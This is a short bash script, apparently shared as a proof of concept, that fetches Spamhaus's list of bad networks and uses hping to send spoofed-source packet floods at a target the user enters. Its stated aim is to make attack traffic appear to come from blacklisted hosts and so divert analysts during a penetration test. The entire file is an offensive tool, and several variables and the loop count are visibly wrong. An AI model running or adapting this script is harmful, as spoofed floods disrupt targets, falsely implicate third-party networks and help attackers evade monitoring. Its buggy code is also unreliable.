# Ensatus.sh v.0 (there will be no other versions...)

# Proof of concept diversion generation script.
# Concept is simple, go out get a random "dirty host" via
# Spamhaus then use that host as a source of an attack. To
# be used while one is say performing a penetration test.
# The goal is simple to generate dirty traffic in an effort
# to "blend in with the crowd." (so much for pinpointing
# those APT sources) 

# This script was never intended to be used for malicious
# purposes, and was created during an internal penetration
# test, where I needed to perform the following tests:
# 1) Ensure SIEM/IPS analysts were monitoring events
# 2) Generate pseudo malicious traffic that QRadar would flag
# 3) Generate garbage traffic to deflect attention from me


ranport=$(( 1+( $(od -An -N2 -i /dev/random) )%(32-1+1) ))
sndport=`echo $ranport | sed 's:-::g' | sed -n '1p'`
pktsnum=$(( 500+( $(od -An -N2 -i /dev/random) )%(500-1+1) ))
rantarg=$((RANDOM%254+1))
randnet=`echo "sed -n '$rantarg" | sed 's:$:p'\'' /tmp/target:g'|sh`

wget -q -O - http://www.spamhaus.org/drop/drop.lasso |\
awk -F "/" '{print $1}' | sed 's:0$::g;s:$\.::g' >> /tmp/target

targets=/tmp/target

if [ -e $target ]

	then

		echo "Enter target"
		read targeted
		echo sending hping -8 $sndport -c $pktnum -a $randnet.$rantarg $targeted |sed 's:\.\.:\.:g'
		echo "How many instances should we send out? (enter a number}"
		read number
		i="0"

	while [ $i -lt 10 ]

		do

			echo hping -8 $sndport -c $sndport -i 100 -a $randnet.$rantarg $targeted |\
			sed 's:\.\.:\.:g' |\
			sh &
			i=$[$i+1]

		done

	else

		wget -q -O - http://www.spamhaus.org/drop/drop.lasso |\
		awk -F "/" '{print $1}' | sed 's:0$::g;s:$\.::g' >> /tmp/target

fi

rm -rf /tmp/target
